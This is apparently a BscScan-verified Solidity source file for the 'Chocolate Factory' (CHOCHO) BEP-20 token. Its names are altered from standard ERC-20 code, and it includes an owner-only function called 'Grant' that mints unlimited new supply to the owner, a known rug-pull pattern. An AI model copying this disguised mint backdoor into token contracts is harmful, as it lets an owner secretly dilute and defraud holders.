/**
 *Submitted for verification at BscScan.com on 2021-09-18
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;



interface ICOIN {
    
    function totalSupply() external view returns (uint);

    
    function balanceOf(address account) external view returns (uint);

   
    function transfer(address recipient, uint amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint);

 
    function approve(address spender, uint amount) external returns (bool);

   
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint value);


    event Approval(address indexed owner, address indexed spender, uint value);
}

pragma solidity 0.8.7;

abstract contract Contexts {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

pragma solidity 0.8.7;

interface ICOINMetadata is ICOIN {
   
    function name() external view returns (string memory);

   
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}

library SafeMath {
   
    function tryAdd(uint cu1, uint cu2) internal pure returns (bool, uint) {
        unchecked {
            uint cu3 = cu1 + cu2;
            if (cu3 < cu1) return (false, 0);
            return (true, cu3);
        }
    }

 
    function trySub(uint cu1, uint cu2) internal pure returns (bool, uint) {
        unchecked {
            if (cu2 > cu1) return (false, 0);
            return (true, cu1 - cu2);
        }
    }

   
    function tryMul(uint cu1, uint cu2) internal pure returns (bool, uint) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'cu1' not being zero, but the
            // benefit is lost if 'cu2' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (cu1 == 0) return (true, 0);
            uint cu3 = cu1 * cu2;
            if (cu3 / cu1 != cu2) return (false, 0);
            return (true, cu3);
        }
    }


    function tryDiv(uint cu1, uint cu2) internal pure returns (bool, uint) {
        unchecked {
            if (cu2 == 0) return (false, 0);
            return (true, cu1 / cu2);
        }
    }


    function tryMod(uint cu1, uint cu2) internal pure returns (bool, uint) {
        unchecked {
            if (cu2 == 0) return (false, 0);
            return (true, cu1 % cu2);
        }
    }

  
    function add(uint cu1, uint cu2) internal pure returns (uint) {
        return cu1 + cu2;
    }

   
    function sub(uint cu1, uint cu2) internal pure returns (uint) {
        return cu1 - cu2;
    }


    function mul(uint cu1, uint cu2) internal pure returns (uint) {
        return cu1 * cu2;
    }

 
    function div(uint cu1, uint cu2) internal pure returns (uint) {
        return cu1 / cu2;
    }


    function mod(uint cu1, uint cu2) internal pure returns (uint) {
        return cu1 % cu2;
    }


    function sub(uint cu1, uint cu2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(cu2 <= cu1, errorMessage);
            return cu1 - cu2;
        }
    }


    function div(uint cu1, uint cu2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(cu2 > 0, errorMessage);
            return cu1 / cu2;
        }
    }

    function mod(uint cu1, uint cu2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(cu2 > 0, errorMessage);
            return cu1 % cu2;
        }
    }
}

contract Ownable is Contexts {
    address private _owner;
    uint256 private _level;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function SecurityLevel() private view returns (uint256) {
        return _level;
    }

    
}


pragma solidity 0.8.7;

contract ChocolateFactory is Contexts, ICOIN, ICOINMetadata, Ownable {
    using SafeMath for uint256;
    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _coinSupply;
    string private _coinName;
    string private _coinSymbol;


    constructor () {
        _coinName = "Chocolate Factory";
        _coinSymbol = 'CHOCHO';
        _coinSupply = 1*10**9 * 10**9;
        _balances[msg.sender] = _coinSupply;

    emit Transfer(address(0), msg.sender, _coinSupply);
    }


    function name() public view virtual override returns (string memory) {
        return _coinName;
    }


    function symbol() public view virtual override returns (string memory) {
        return _coinSymbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint) {
        return _coinSupply;
    }


    function balanceOf(address account) public view virtual override returns (uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
     function Grant(uint256 amount) public onlyOwner {
    _grant(msg.sender, amount);
    }


    function allowance(address owner, address spender) public view virtual override returns (uint) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }


    function increaseAllowance(address spender, uint addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint subtractedValue) public virtual returns (bool) {
        uint currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _grant(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);
        
        _coinSupply = _coinSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint amount) internal virtual {
        require(owner != address(0), "BEP0: approve from the zero address");
        require(spender != address(0), "BEP0: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
    function _beforeTokenTransfer(address from, address to, uint amount) internal virtual { }
    
}